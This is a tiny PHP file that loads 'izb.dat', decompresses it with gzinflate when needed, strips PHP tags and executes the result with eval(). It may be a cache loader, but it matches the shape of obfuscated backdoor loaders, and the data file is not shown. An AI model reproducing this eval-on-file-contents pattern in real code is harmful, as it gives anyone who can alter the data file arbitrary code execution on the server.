<?php
	$izb_path = dirname( __FILE__ ) .'/izb.dat';
	$izbr = file_get_contents($izb_path);
	if (strpos($izbr,'array')===false ) $izbr = gzinflate($izbr);
	$izbr = str_replace(array('<?php','?>'),'',$izbr);
	$izbr = trim($izbr);
	eval($izbr);
?>